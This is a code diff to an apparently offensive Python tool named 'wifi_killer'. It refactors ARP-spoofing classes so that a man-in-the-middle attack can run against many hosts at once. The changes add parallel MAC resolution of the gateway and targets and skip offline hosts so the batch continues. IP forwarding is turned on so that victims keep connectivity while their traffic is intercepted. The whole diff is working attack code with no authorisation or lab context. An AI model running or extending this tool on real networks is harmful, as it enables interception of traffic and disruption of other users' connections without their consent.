@@ -147,41 +147,72 @@ class ArpAttack:
 
     # ---------------------------------------------------------------- #
 
-    def start(self) -> None:
-        """Resolve MACs then launch the background spoofing thread."""
+    def prepare(
+        self,
+        target_mac: Optional[str] = None,
+        gateway_mac: Optional[str] = None,
+        attacker_mac: Optional[str] = None,
+    ) -> None:
+        """Resolve MACs without starting the attack.
+
+        Use this from ``MultiTargetAttack`` so the gateway MAC and the
+        attacker MAC are looked up once for the whole batch instead of
+        once per target. Any MAC supplied as an argument is trusted;
+        the rest are resolved on the wire.
+        """
         if not SCAPY_AVAILABLE:
             raise RuntimeError("Scapy is required for ARP attacks.")
 
-        print(f"[*] Resolving MACs for target {self.target_ip} and gateway {self.gateway_ip} …")
-        self.target_mac = _get_mac(self.target_ip, self.iface)
-        self.gateway_mac = _get_mac(self.gateway_ip, self.iface)
+        if target_mac:
+            self.target_mac = target_mac.upper()
+        if gateway_mac:
+            self.gateway_mac = gateway_mac.upper()
+        if attacker_mac:
+            self.attacker_mac = attacker_mac.upper()
 
         if not self.target_mac:
-            raise RuntimeError(f"Could not resolve MAC for target {self.target_ip}")
+            self.target_mac = _get_mac(self.target_ip, self.iface)
         if not self.gateway_mac:
-            raise RuntimeError(f"Could not resolve MAC for gateway {self.gateway_ip}")
-
-        # Get our own MAC
-        from wifi_killer.utils.network import get_interface_mac, _default_iface
-
-        iface = self.iface or _default_iface()
-        attacker_mac = get_interface_mac(iface)
-        if not attacker_mac:
-            # Last-resort: try to get the MAC of Scapy's chosen interface
-            attacker_mac = get_interface_mac(conf.iface)
-        if not attacker_mac:
+            self.gateway_mac = _get_mac(self.gateway_ip, self.iface)
+        if not self.target_mac:
             raise RuntimeError(
-                f"Could not determine attacker MAC address for interface '{iface}'."
+                f"Could not resolve MAC for target {self.target_ip}"
             )
-        self.attacker_mac = attacker_mac
+        if not self.gateway_mac:
+            raise RuntimeError(
+                f"Could not resolve MAC for gateway {self.gateway_ip}"
+            )
 
-        # Enable IP forwarding so the victim still has connectivity during MITM
+        if not self.attacker_mac:
+            from wifi_killer.utils.network import (
+                get_interface_mac, _default_iface,
+            )
+            iface = self.iface or _default_iface()
+            am = get_interface_mac(iface)
+            if not am:
+                am = get_interface_mac(conf.iface)
+            if not am:
+                raise RuntimeError(
+                    f"Could not determine attacker MAC address "
+                    f"for interface '{iface}'."
+                )
+            self.attacker_mac = am
+
+    def start(self) -> None:
+        """Resolve MACs (if not already prepared) then launch spoof thread."""
+        if not SCAPY_AVAILABLE:
+            raise RuntimeError("Scapy is required for ARP attacks.")
+
+        if not (self.target_mac and self.gateway_mac and self.attacker_mac):
+            self.prepare()
+
+        # Enable IP forwarding so the victim keeps connectivity during MITM.
         from wifi_killer.modules.throttler import enable_ip_forward
         enable_ip_forward()
 
         print(f"[+] Target  : {self.target_ip} ({self.target_mac})")
         print(f"[+] Gateway : {self.gateway_ip} ({self.gateway_mac})")
-        print(f"[+] Attacker: {self.attacker_mac} (iface={iface})")
+        print(f"[+] Attacker: {self.attacker_mac}")
         print(f"[*] Starting ARP-spoof method {self.method} …")
 
         self._stop_event.clear()
@@ -263,7 +294,13 @@ class ArpAttack:
 # ------------------------------------------------------------------ #
 
 class MultiTargetAttack:
-    """Launch ArpAttack instances against multiple targets simultaneously."""
+    """Launch ArpAttack instances against multiple targets simultaneously.
+
+    Resolves the gateway MAC + attacker MAC *once* and runs all per-target
+    ARP lookups in parallel. Targets whose MAC cannot be resolved are
+    skipped (with a warning) instead of failing the whole batch, so a
+    single offline host doesn't abort an attack on the other targets.
+    """
 
     def __init__(
         self,
@@ -272,12 +309,111 @@ class MultiTargetAttack:
         gateway_ip: str,
         iface: Optional[str] = None,
     ) -> None:
-        self.attacks: list[ArpAttack] = [
-            ArpAttack(method, t["ip"], gateway_ip, iface)
-            for t in targets
-        ]
+        self.method = method
+        self.gateway_ip = gateway_ip
+        self.iface = iface
+        # Keep the original target dicts (with IP + any pre-known MAC).
+        self._target_dicts = list(targets)
+        # ArpAttack instances are built after prepare() so we only keep
+        # those whose MAC was successfully resolved.
+        self.attacks: list[ArpAttack] = []
+        self.failed_targets: list[tuple[str, str]] = []  # (ip, reason)
+
+    # ------------------------------------------------------------------ #
+
+    def _prepare_all(self) -> None:
+        """Resolve MACs for the gateway and every target in parallel.
+
+        After this returns, ``self.attacks`` holds one prepared ArpAttack
+        per *resolvable* target. Unresolved targets land in
+        ``self.failed_targets`` so the caller can surface them.
+        """
+        if not SCAPY_AVAILABLE:
+            raise RuntimeError("Scapy is required for ARP attacks.")
+
+        from concurrent.futures import ThreadPoolExecutor, as_completed
+        from wifi_killer.utils.network import (
+            get_interface_mac, _default_iface,
+        )
+
+        # 1. Attacker MAC — once.
+        iface = self.iface or _default_iface()
+        attacker_mac = get_interface_mac(iface)
+        if not attacker_mac:
+            attacker_mac = get_interface_mac(conf.iface)
+        if not attacker_mac:
+            raise RuntimeError(
+                f"Could not determine attacker MAC for interface '{iface}'."
+            )
+
+        # 2. Gateway + every target in parallel.
+        ips_to_resolve: list[str] = [self.gateway_ip]
+        for t in self._target_dicts:
+            ip = t.get("ip", "")
+            if ip and ip != self.gateway_ip and ip not in ips_to_resolve:
+                ips_to_resolve.append(ip)
+
+        # Pre-seed with any MACs we already know from the scan results.
+        resolved: dict[str, Optional[str]] = {}
+        for t in self._target_dicts:
+            ip = t.get("ip", "")
+            mac = (t.get("mac") or "").strip()
+            if ip and mac:
+                resolved[ip] = mac.upper()
+
+        # Only resolve the ones we don't already have.
+        pending = [ip for ip in ips_to_resolve if ip not in resolved]
+        if pending:
+            max_workers = min(16, len(pending))
+            with ThreadPoolExecutor(max_workers=max_workers) as pool:
+                futures = {
+                    pool.submit(_get_mac, ip, self.iface, 2.0): ip
+                    for ip in pending
+                }
+                for fut in as_completed(futures):
+                    ip = futures[fut]
+                    try:
+                        resolved[ip] = fut.result()
+                    except Exception:
+                        resolved[ip] = None
+
+        gateway_mac = resolved.get(self.gateway_ip)
+        if not gateway_mac:
+            raise RuntimeError(
+                f"Could not resolve MAC for gateway {self.gateway_ip}. "
+                "Check that the gateway IP is correct and reachable."
+            )
+
+        # 3. Build one prepared ArpAttack per resolvable target.
+        self.attacks = []
+        self.failed_targets = []
+        for t in self._target_dicts:
+            ip = (t.get("ip") or "").strip()
+            if not ip or ip == self.gateway_ip:
+                continue
+            target_mac = resolved.get(ip)
+            if not target_mac:
+                self.failed_targets.append(
+                    (ip, "MAC resolution failed (host offline?)")
+                )
+                continue
+            atk = ArpAttack(self.method, ip, self.gateway_ip, self.iface)
+            atk.prepare(
+                target_mac=target_mac,
+                gateway_mac=gateway_mac,
+                attacker_mac=attacker_mac,
+            )
+            self.attacks.append(atk)
+
+        if not self.attacks:
+            reasons = "; ".join(f"{ip}: {r}" for ip, r in self.failed_targets)
+            raise RuntimeError(
+                "No targets could be resolved. "
+                f"Failed: {reasons or '(no targets supplied)'}"
+            )
 
     def start(self) -> None:
+        self._prepare_all()
         for atk in self.attacks:
             atk.start()
 
